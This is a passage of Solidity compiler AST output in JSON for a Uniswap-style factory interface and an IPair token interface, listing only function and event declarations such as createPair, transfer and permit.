													"id": 573,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "569:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "568:9:3"
									},
									"scope": 601,
									"src": "520:58:3",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 585,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "createPair",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 581,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 578,
												"name": "tokenA",
												"nodeType": "VariableDeclaration",
												"scope": 585,
												"src": "613:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 577,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "613:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 580,
												"name": "tokenB",
												"nodeType": "VariableDeclaration",
												"scope": 585,
												"src": "637:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 579,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "637:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "603:54:3"
									},
									"returnParameters": {
										"id": 584,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 583,
												"name": "pair",
												"nodeType": "VariableDeclaration",
												"scope": 585,
												"src": "676:12:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 582,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "676:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "675:14:3"
									},
									"scope": 601,
									"src": "584:106:3",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 590,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "setFeeTo",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 588,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 587,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 590,
												"src": "714:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 586,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "714:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "713:9:3"
									},
									"returnParameters": {
										"id": 589,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "731:0:3"
									},
									"scope": 601,
									"src": "696:36:3",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 595,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "setFeeToSetter",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 593,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 592,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 595,
												"src": "762:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 591,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "762:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "761:9:3"
									},
									"returnParameters": {
										"id": 594,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "779:0:3"
									},
									"scope": 601,
									"src": "738:42:3",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 600,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "INIT_CODE_PAIR_HASH",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 596,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "814:2:3"
									},
									"returnParameters": {
										"id": 599,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 598,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 600,
												"src": "840:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 597,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "840:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "839:9:3"
									},
									"scope": 601,
									"src": "786:63:3",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								}
							],
							"scope": 602,
							"src": "62:789:3"
						}
					],
					"src": "36:816:3"
				},
				"id": 3
			},
			"IPair.sol": {
				"ast": {
					"absolutePath": "IPair.sol",
					"exportedSymbols": {
						"IPair": [
							852
						]
					},
					"id": 853,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 603,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "36:24:4"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 852,
							"linearizedBaseContracts": [
								852
							],
							"name": "IPair",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": null,
									"id": 611,
									"name": "Approval",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 610,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 605,
												"indexed": true,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 611,
												"src": "108:21:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 604,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "108:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 607,
												"indexed": true,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 611,
												"src": "139:23:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 606,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "139:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 609,
												"indexed": false,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 611,
												"src": "172:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 608,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "172:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "98:93:4"
									},
									"src": "84:108:4"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 619,
									"name": "Transfer",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 618,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 613,
												"indexed": true,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 619,
												"src": "212:20:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 612,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "212:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 615,
												"indexed": true,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 619,
												"src": "234:18:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 614,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "234:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 617,
												"indexed": false,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 619,
												"src": "254:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 616,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "254:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "211:57:4"
									},
									"src": "197:72:4"
								},
								{
									"body": null,
									"documentation": null,
									"id": 624,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "name",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 620,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "288:2:4"
									},
									"returnParameters": {
										"id": 623,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 622,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 624,
												"src": "314:13:4",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 621,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "314:6:4",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "313:15:4"
									},
									"scope": 852,
									"src": "275:54:4",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 629,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "symbol",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 625,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "350:2:4"
									},
									"returnParameters": {
										"id": 628,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 627,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 629,
												"src": "376:13:4",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 626,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "376:6:4",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "375:15:4"
									},
									"scope": 852,
									"src": "335:56:4",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 634,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "decimals",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 630,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "414:2:4"
									},
									"returnParameters": {
										"id": 633,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 632,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 634,
												"src": "440:5:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 631,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "440:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "439:7:4"
									},
									"scope": 852,
									"src": "397:50:4",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 639,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "totalSupply",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 635,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "473:2:4"
									},
									"returnParameters": {
										"id": 638,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 637,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 639,
												"src": "499:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 636,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "499:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "498:9:4"
									},
									"scope": 852,
									"src": "453:55:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 646,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "balanceOf",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 642,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 641,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 646,
												"src": "533:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 640,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "533:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "532:15:4"
									},
									"returnParameters": {
										"id": 645,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 644,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 646,
												"src": "571:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 643,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "571:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "570:9:4"
									},
									"scope": 852,
									"src": "514:66:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 655,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "allowance",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 651,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 648,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 655,
												"src": "614:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 647,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "614:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 650,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 655,
												"src": "637:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 649,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "637:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "604:54:4"
									},
									"returnParameters": {
										"id": 654,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 653,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 655,
												"src": "682:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 652,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "682:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "681:9:4"
									},
									"scope": 852,
									"src": "586:105:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 664,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "approve",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 660,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 657,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 664,
												"src": "714:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 656,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "714:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 659,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 664,
												"src": "731:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 658,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "731:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "713:32:4"
									},
									"returnParameters": {
										"id": 663,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 662,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 664,
												"src": "764:4:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 661,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "764:4:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "763:6:4"
									},
									"scope": 852,
									"src": "697:73:4",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 673,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 669,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 666,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 673,
												"src": "794:10:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 665,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "794:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 668,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 673,
												"src": "806:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 667,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "806:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "793:27:4"
									},
									"returnParameters": {
										"id": 672,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 671,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 673,
												"src": "839:4:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 670,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "839:4:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "838:6:4"
									},
									"scope": 852,
									"src": "776:69:4",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 684,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transferFrom",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 680,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 675,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 684,
												"src": "882:12:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 674,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "882:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 677,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 684,
												"src": "904:10:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 676,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "904:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 679,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 684,
												"src": "924:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 678,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "924:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "872:71:4"
									},
									"returnParameters": {
										"id": 683,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 682,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 684,
												"src": "962:4:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 681,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "962:4:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "961:6:4"
									},
									"scope": 852,
									"src": "851:117:4",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 689,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "DOMAIN_SEPARATOR",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 685,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "999:2:4"
									},
									"returnParameters": {
										"id": 688,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 687,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 689,
												"src": "1025:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 686,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "1025:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1024:9:4"
									},
									"scope": 852,
									"src": "974:60:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 694,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "PERMIT_TYPEHASH",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 690,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1064:2:4"
									},
									"returnParameters": {
										"id": 693,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 692,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 694,
												"src": "1090:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 691,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "1090:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1089:9:4"
									},
									"scope": 852,
									"src": "1040:59:4",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 701,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "nonces",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 697,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 696,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 701,
												"src": "1121:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 695,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1121:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1120:15:4"
									},
									"returnParameters": {
										"id": 700,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 699,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 701,
												"src": "1159:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 698,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1159:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1158:9:4"
									},
									"scope": 852,
									"src": "1105:63:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 718,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "permit",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 716,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 703,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 718,
												"src": "1199:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 702,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1199:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 705,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 718,
												"src": "1222:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 704,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1222:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 707,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 718,
												"src": "1247:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
